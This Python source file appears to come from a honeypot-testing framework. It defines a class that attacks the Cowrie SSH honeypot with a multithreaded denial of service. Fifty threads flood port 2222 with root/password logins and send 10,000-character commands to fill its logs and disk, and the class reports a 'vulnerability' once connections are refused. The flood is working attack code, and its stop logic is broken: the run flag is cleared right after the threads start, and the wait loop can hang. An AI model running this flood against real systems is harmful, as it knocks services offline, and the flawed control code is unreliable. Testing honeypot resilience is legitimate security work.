import paramiko
import time
import threading
from scapy.all import *
from typing import TypeAlias
from .base_attack import AttackResults, BaseAttack, BaseHoneypot

class DoSCowrie(BaseAttack):
    """
    Implements DoS attack against the Cowrie honeypot.
    This attack floods Cowrie's SSH service with connections and spams logs.
    
    Args:
        honeypot (BaseHoneypot): The Cowrie honeypot object.
    """
    
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """ Initializes the Cowrie DoS attack with target details. """
        super().__init__(honeypot)
        self.honeypot_rejecting_connections: bool = False
        self.target_ip: str = honeypot.ip
        self.ssh_port: int = 2222  # Default Cowrie SSH Port
        self.num_threads: int = 50  # Number of concurrent attack threads
        self.attack_running: bool = True  # Flag to control attack execution

    def start_ssh_flood(self) -> None:
        """
        Floods Cowrie's SSH service with excessive login attempts.
        This attack attempts to exhaust connection limits.
        """
        while self.attack_running:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(self.target_ip, port=self.ssh_port, username="root", password="password", timeout=1)
            except Exception:
                self.honeypot_rejecting_connections = True
                break
            finally:
                client.close()
            time.sleep(0.01)  # Slight delay to keep attack continuous

    def start_log_spam(self) -> None:
        """
        Spams the Cowrie logs with large command outputs.
        This aims to fill up disk space and slow down processing.
        """
        while self.attack_running:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(self.target_ip, port=self.ssh_port, username="root", password="password", timeout=2)
                client.exec_command("echo " + "A" * 10000)  # 10,000-character command
            except Exception:
                self.honeypot_rejecting_connections = True
                break
            finally:
                client.close()
            time.sleep(0.01)  # Maintain steady log flooding

    def manage_attack(self) -> None:
        """
        Manages the DoS attack using multiple threads.
        Each thread continuously floods the target until the attack is stopped.
        """
        threads: list[threading.Thread] = [
            threading.Thread(target=self.start_ssh_flood) for _ in range(self.num_threads // 2)
        ] + [
            threading.Thread(target=self.start_log_spam) for _ in range(self.num_threads // 2)
        ]

        for thread in threads:
            thread.start()

        #time.sleep(10)  # Run attack for 10 seconds before stopping
        self.attack_running = False

        while not self.honeypot_rejecting_connections:
            time.sleep(1)

        for thread in threads:
            thread.join()

    def run_attack(self) -> AttackResults:
        """
        Executes the Cowrie DoS attack and measures its impact.

        Returns:
            AttackResults: The result of the attack, indicating whether Cowrie was affected.
        """
        print(f"[+] Running DoS attack on Cowrie at {self.target_ip}:{self.ssh_port}")
        start_time: float = time.time()
        self.manage_attack()
        end_time: float = time.time()

        time_taken: float = end_time - start_time

        if self.honeypot_rejecting_connections:
            return (True,
                    "Vulnerability found: DoS attack made the honeypot "
                    "reject connections",
                    time_taken,
                    self.num_threads)
        else:
            return (False,
                    "Vulnerability not found: DoS attack did not make the "
                    "honeypot reject connections",
                    time_taken,
                    self.num_threads)
